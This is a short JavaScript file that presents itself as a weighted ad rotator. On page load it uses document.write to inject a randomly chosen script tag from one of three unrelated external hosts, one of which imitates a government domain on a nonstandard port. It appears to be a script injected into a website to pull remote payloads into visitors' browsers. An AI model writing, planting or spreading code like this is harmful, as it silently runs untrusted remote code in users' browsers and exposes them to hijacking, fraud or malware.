var randoms = {
	ads_codes: ['<script type=\'text/javascript\' charset=\'UTF-8\' async src=\'https://mg.njzyjy.cn/m/5512?6892776\'><'+'/script>','<script src="https://www.govjieyang.cn:12443/ty/2100A8BE-CA0F-1889-33-AB5BF5C59899.alpha"><'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'http://k.40fenzhong.com/d.php?pid=3860\'><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();